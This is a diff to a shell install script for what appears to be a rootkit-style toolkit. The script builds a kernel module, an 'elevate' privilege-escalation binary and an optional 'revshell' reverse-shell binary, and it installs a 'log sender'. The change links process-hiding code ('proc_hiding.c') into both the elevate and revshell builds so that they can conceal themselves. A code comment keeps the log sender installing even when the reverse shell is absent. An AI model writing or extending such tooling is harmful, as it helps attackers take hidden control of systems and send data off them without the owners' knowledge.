@@ -40,13 +40,13 @@ make -C "$MODULE_DIR"
 [ -f "$MODULE_FILE" ]
 
 # Build elevate
-cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
+cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" "$MODULE_DIR/proc_hiding.c"
 
 # Build revshell inside $MODULE_DIR.  The reverse-shell half of the project is
 # optional: if the sources are not shipped, skip them instead of aborting the
 # whole install (which would also stop the log sender from being installed).
 if [ -f "$MODULE_DIR/revshell.c" ]; then
-    cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
+    cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
     chmod 755 "$MODULE_DIR/revshell"
 fi
 
